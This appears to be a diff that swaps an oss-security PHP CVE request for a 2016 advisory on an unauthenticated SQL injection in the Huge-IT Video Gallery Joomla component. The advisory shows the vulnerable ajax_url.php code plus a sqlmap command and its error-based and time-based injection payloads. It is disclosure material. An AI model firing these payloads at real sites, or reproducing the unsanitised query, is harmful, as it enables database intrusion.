@@ -1,54 +1,85 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/15/6
-Message-ID: <CAEsznC48dANrm2DNVq3jh-PMiYu-72DE7ybFJo3z0RMsiKmi2A@mail.gmail.com>
-Date: Thu, 15 Sep 2016 14:44:40 +0300
-From: Lior Kaplan <kaplanlior@...il.com>
-To: oss-security@...ts.openwall.com
-Cc: "security@....net" <security@....net>
-Subject: CVE assignment for PHP 5.6.26 and 7.0.11
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/21/12
+Message-id: <9DC1F462-75B5-4A12-80FB-C0924D1E89E5@me.com>
+Date: Wed, 21 Sep 2016 16:24:44 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Unauthenticated SQL Injection in Huge-IT Video Gallery v1.0.9 for Joomla
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Title: Unauthenticated SQL Injection in Huge-IT Video Gallery v1.0.9 for Joomla
+Author: Larry W. Cashdollar, @_larry0
+Date: 2016-09-15
+Download Site: http://huge-it.com/joomla-video-gallery/
+Vendor: www.huge-it.com, fixed v1.1.0
+Vendor Notified: 2016-09-17
+Vendor Contact: info@...e-it.com
+Description: A video slideshow gallery.
+Vulnerability:
+The following code does not prevent an unauthenticated user from injecting SQL into functions located in ajax_url.php. 
 
-Both PHP versions have been tagged.
+Vulnerable Code in : ajax_url.php
 
-Please assign CVEs to the following issues:
+ 11 define('_JEXEC',1);
+ 12 defined('_JEXEC') or die('Restircted access');
+.
+.
+.
+ 28         if($_POST['task']=="load_videos_content"){
+ 29 
+ 30             $page = 1;
+ 31 
+ 32 
+ 33             if(!empty($_POST["page"]) && is_numeric($_POST['page']) && $_POST['page']>0){
+ 34                 $paramssld='';
+ 35                 $db5 = JFactory::getDBO();
+ 36                 $query5 = $db->getQuery(true);
+ 37                 $query5->select('*');
+ 38                 $query5->from('#__huge_it_videogallery_params');
+ 39                 $db->setQuery($query5);
+ 40                 $options_params = $db5->loadObjectList();
+ 41                 foreach ($options_params as $rowpar) {
+ 42                     $key = $rowpar->name;
+ 43                     $value = $rowpar->value;
+ 44                     $paramssld[$key] = $value;
+ 45                 }
+ 46                 $page = $_POST["page"];
+ 47                 $num=$_POST['perpage'];
+ 48                 $start = $page * $num - $num;
+ 49                 $idofgallery=$_POST['galleryid'];
+ 50 
+ 51                 $query = $db->getQuery(true);
+ 52                 $query->select('*');
+ 53                 $query->from('#__huge_it_videogallery_videos');
+ 54                 $query->where('videogallery_id ='.$idofgallery);
+ 55                 $query ->order('#__huge_it_videogallery_videos.ordering asc');
+ 56                 $db->setQuery($query,$start,$num);
 
-PHP 5.6.26 only:
-
-bug #73052 (Memory Corruption in During Deserialized-object Destruction).
-https://bugs.php.net/bug.php?id=73052
-http://git.php.net/?p=php-src.git;a=commit;h=6a7cc8ff85827fa9ac715b3a83c2d9147f33cd43
-
-
-PHP 5.6.26 and 7.0.11:
-
-bug #72293 (Heap overflow in mysqlnd related to BIT fields).
-https://bugs.php.net/bug.php?id=72293
-http://git.php.net/?p=php-src.git;a=commit;h=28f80baf3c53e267c9ce46a2a0fadbb981585132
-
-bug #72860 (wddx_deserialize use-after-free).
-https://bugs.php.net/bug.php?id=72860
-http://git.php.net/?p=php-src.git;a=commit;h=b88393f08a558eec14964a55d3c680fe67407712
-
-bug #72928 (Out of bound when verify signature of zip phar in
-phar_parse_zipfile).
-https://bugs.php.net/bug.php?id=72928
-http://git.php.net/?p=php-src.git;a=commit;h=0bfb970f43acd1e81d11be1154805f86655f15d5
-
-bug #73007 (add locale length check).
-https://bugs.php.net/bug.php?id=73007
-http://git.php.net/?p=php-src.git;a=commit;h=6d55ba265637d6adf0ba7e9c9ef11187d1ec2f5b
-
-bug #73029 (Missing type check when unserializing SplArray).
-https://bugs.php.net/bug.php?id=73029
-http://git.php.net/?p=php-src.git;a=commit;h=ecb7f58a069be0dec4a6131b6351a761f808f22e
-
-bug #73065 (Out-Of-Bounds Read in php_wddx_push_element).
-https://bugs.php.net/bug.php?id=73065
-http://git.php.net/?p=php-src.git;a=commit;h=c4cca4c20e75359c9a13a1f9a36cb7b4e9601d29
-
-Thanks,
-
-Kaplan
-
+CVE-2016-1000123
+Exploit Code:
+	• $ sqlmap -u 'http://example.com/components/com_videogallerylite/ajax_url.php' --data="page=1&galleryid=*&task=load_videos_content&perpage=20&linkbutton=2"  --level=5 --risk=3
+	• .
+	• .
+	• .
+	• (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+	• sqlmap identified the following injection point(s) with a total of 2870 HTTP(s) requests:
+	• ---
+	• Parameter: #1* ((custom) POST)
+	•     Type: error-based
+	•     Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
+	•     Payload: page=1&galleryid=-3390 OR 1 GROUP BY CONCAT(0x716b766271,(SELECT (CASE WHEN (2575=2575) THEN 1 ELSE 0 END)),0x7170767071,FLOOR(RAND(0)*2)) HAVING MIN(0)#&task=load_videos_content&perpage=20&linkbutton=2
+	•  
+	•     Type: AND/OR time-based blind
+	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+	•     Payload: page=1&galleryid=(CASE WHEN (5952=5952) THEN SLEEP(5) ELSE 5952 END)&task=load_videos_content&perpage=20&linkbutton=2
+	• ---
+	• [19:36:55] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Debian 8.0 (jessie)
+	• web application technology: Apache 2.4.10
+	• back-end DBMS: MySQL >= 5.0.12
+	• [19:36:55] [WARNING] HTTP error codes detected during run:
+	• 500 (Internal Server Error) - 2714 times
+	• [19:36:55] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/192.168.0.4'
+	•  
+	• [*] shutting down at 19:36:55
+Advisory: http://www.vapidlabs.com/advisory.php?v=169
